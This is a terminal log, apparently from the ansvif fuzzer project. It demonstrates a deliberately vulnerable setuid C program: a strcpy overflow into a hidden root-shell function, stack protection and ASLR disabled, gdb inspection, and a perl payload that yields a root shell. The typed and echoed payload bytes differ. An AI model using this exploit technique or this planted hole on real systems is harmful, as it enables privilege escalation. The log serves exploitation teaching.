@@ -1,0 +1,169 @@
+marshall@i.code.pwnz.org:[~/ansvif]: cat src/faulty.c
+/*
+ * ansvif
+ * A Not So Very Intelligent Fuzzer
+ * Marshall Whittaker / oxagast
+ *
+ *
+ *    __ _  _  __   ___  __  ____ ____
+ *  /  ( \/ )/ _\ / __)/ _\/ ___(_  _)
+ * (  O )  (/    ( (_ /    \___ \ )(
+ *  \__(_/\_\_/\_/\___\_/\_(____/(__)
+ */
+
+//#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+void func(char **argv) {
+  printf("running strcpy...\n");
+  char arr[16];
+  strcpy(arr, argv[2]);
+  return;
+}
+void spawnme() {
+  setuid(0);
+  int stat = system("/bin/sh");
+}
+int main(int argc, char *argv[]) {
+  int blah = 0;
+  if (argc != 3) {
+    printf("2 args yo.\n");
+    exit(1);
+  }
+  if (argc == 3) {
+    func(argv);
+  }
+  if (blah == 1)
+    spawnme();
+  else
+    printf("wut?\n");
+  exit(1);
+}
+marshall@i.code.pwnz.org:[~/ansvif]: gcc src/faulty.c -o faulty -D_GNU_SOURCE -Wno-implicit-function-declaration -fno-stack-protector
+marshall@i.code.pwnz.org:[~/ansvif]: sudo chown root:root ./faulty && sudo chmod a+s ./faulty
+marshall@i.code.pwnz.org:[~/ansvif]: sudo sh -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
+marshall@i.code.pwnz.org:[~/ansvif]: ./faulty a a
+running strcpy...
+wut?
+marshall@i.code.pwnz.org:[~/ansvif]: ./faulty a AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+running strcpy...
+Segmentation fault
+marshall@i.code.pwnz.org:[~/ansvif]: gdb ./faulty
+GNU gdb (Debian 7.12-6) 7.12.0.20161007-git
+Copyright (C) 2016 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ./faulty...(no debugging symbols found)...done.
+(gdb) r A AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Starting program: /home/marshall/ansvif/faulty A AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+running strcpy...
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000555555554804 in func ()
+(gdb) info registers
+rax            0x7fffffffe580   140737488348544
+rbx            0x0      0
+rcx            0x41414141       1094795585
+rdx            0x414141 4276545
+rsi            0x7fffffffe920   140737488349472
+rdi            0x7fffffffe5a8   140737488348584
+rbp            0x4141414141414141       0x4141414141414141
+rsp            0x7fffffffe598   0x7fffffffe598
+r8             0x555555756000   93824994336768
+r9             0x0      0
+r10            0x5b     91
+r11            0x7ffff7b97ba8   140737349516200
+r12            0x5555555546a0   93824992233120
+r13            0x7fffffffe6a0   140737488348832
+r14            0x0      0
+r15            0x0      0
+rip            0x555555554804   0x555555554804 <func+52>
+eflags         0x10206  [ PF IF RF ]
+cs             0x33     51
+ss             0x2b     43
+ds             0x0      0
+es             0x0      0
+fs             0x0      0
+gs             0x0      0
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x000055555555482e <+0>:     push   %rbp
+   0x000055555555482f <+1>:     mov    %rsp,%rbp
+   0x0000555555554832 <+4>:     sub    $0x20,%rsp
+   0x0000555555554836 <+8>:     mov    %edi,-0x14(%rbp)
+   0x0000555555554839 <+11>:    mov    %rsi,-0x20(%rbp)
+   0x000055555555483d <+15>:    movl   $0x0,-0x4(%rbp)
+   0x0000555555554844 <+22>:    cmpl   $0x3,-0x14(%rbp)
+   0x0000555555554848 <+26>:    je     0x555555554860 <main+50>
+   0x000055555555484a <+28>:    lea    0xed(%rip),%rdi        # 0x55555555493e
+   0x0000555555554851 <+35>:    callq  0x555555554650 <puts@plt>
+   0x0000555555554856 <+40>:    mov    $0x1,%edi
+   0x000055555555485b <+45>:    callq  0x555555554670 <exit@plt>
+   0x0000555555554860 <+50>:    cmpl   $0x3,-0x14(%rbp)
+   0x0000555555554864 <+54>:    jne    0x555555554872 <main+68>
+   0x0000555555554866 <+56>:    mov    -0x20(%rbp),%rax
+   0x000055555555486a <+60>:    mov    %rax,%rdi
+   0x000055555555486d <+63>:    callq  0x5555555547d0 <func>
+   0x0000555555554872 <+68>:    cmpl   $0x1,-0x4(%rbp)
+   0x0000555555554876 <+72>:    jne    0x555555554884 <main+86>
+   0x0000555555554878 <+74>:    mov    $0x0,%eax
+   0x000055555555487d <+79>:    callq  0x555555554805 <spawnme>
+   0x0000555555554882 <+84>:    jmp    0x555555554890 <main+98>
+   0x0000555555554884 <+86>:    lea    0xbe(%rip),%rdi        # 0x555555554949
+   0x000055555555488b <+93>:    callq  0x555555554650 <puts@plt>
+   0x0000555555554890 <+98>:    mov    $0x1,%edi
+   0x0000555555554895 <+103>:   callq  0x555555554670 <exit@plt>
+End of assembler dump.
+(gdb) disa
+disable      disassemble
+(gdb) disassemble spawnme
+Dump of assembler code for function spawnme:
+   0x0000555555554805 <+0>:     push   %rbp
+   0x0000555555554806 <+1>:     mov    %rsp,%rbp
+   0x0000555555554809 <+4>:     sub    $0x10,%rsp
+   0x000055555555480d <+8>:     mov    $0x0,%edi
+   0x0000555555554812 <+13>:    mov    $0x0,%eax
+   0x0000555555554817 <+18>:    callq  0x555555554680 <setuid@plt>
+   0x000055555555481c <+23>:    lea    0x113(%rip),%rdi        # 0x555555554936
+   0x0000555555554823 <+30>:    callq  0x555555554660 <system@plt>
+   0x0000555555554828 <+35>:    mov    %eax,-0x4(%rbp)
+   0x000055555555482b <+38>:    nop
+   0x000055555555482c <+39>:    leaveq
+   0x000055555555482d <+40>:    retq
+End of assembler dump.
+(gdb) r -a $(perl -e 'print "A"x24;print "\x05\x58\x55\x55\x55\x55"')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/marshall/ansvif/faulty -a $(perl -e 'print "A"x24;print "\x05\x48\x55\x55\x55\x55"')
+running strcpy...
+$ exit
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007fffffffe6b8 in ?? ()
+(gdb) quit
+A debugging session is active.
+
+        Inferior 1 [process 29650] will be killed.
+
+Quit anyway? (y or n) y
+marshall@i.code.pwnz.org:[~/ansvif]: ls -al faulty
+-rwsr-sr-x 1 root root 8896 May  3 06:44 faulty
+marshall@i.code.pwnz.org:[~/ansvif]: /home/marshall/ansvif/faulty -a $(perl -e 'print "A"x24;print "\x05\x48\x55\x55\x55\x55"')
+running strcpy...
+# id
+uid=0(root) gid=100(users) egid=0(root) groups=0(root),27(sudo),100(users)
+# exit
+Segmentation fault
+marshall@i.code.pwnz.org:[~/ansvif]: :)
